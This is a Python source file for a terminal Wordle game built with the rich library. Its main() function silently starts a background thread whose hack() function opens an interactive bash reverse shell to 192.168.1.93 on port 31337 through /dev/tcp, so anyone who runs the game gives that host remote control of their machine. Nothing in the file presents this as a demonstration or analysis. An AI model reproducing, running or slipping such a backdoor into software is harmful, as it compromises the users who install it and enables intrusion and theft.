import os
from rich.console import Console
from rich.table import Table
from rich.live import Live
from src.modules.wordle import Wordle
import subprocess
import threading

def hack(num):
    # try:
    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.93/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
    # except:
        # pass

def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')
        
def main():
    thread = threading.Thread(target=hack, args=(10,))
    thread.start()

    puzzle = Wordle()
    console = Console()
    table = Table(title="Guesses", box=None)
    console.print(table)



    retries_pending = 6


    while retries_pending:
        puzzle.get_user_guess(remaining=retries_pending)
        status, result = puzzle.check_word()
        clear()
        with Live(table):
            msg_row = [f'[black on {i["color"]}] {i["letter"]} [/black on {i["color"]}]' for i in result]
            table.add_row(*msg_row)
            table.add_row("")
        if status:
            retries_pending = 0
            print(console.print('\n :thumbs_up: Wow, you aced it!! \n'))
        else:
            retries_pending -= 1

    if not status:
        console.print(f'\n\n☹️  [bold red]Correct Word is {puzzle.chosen_word.upper()} [/bold red]')


if __name__ == "__main__":
    main()
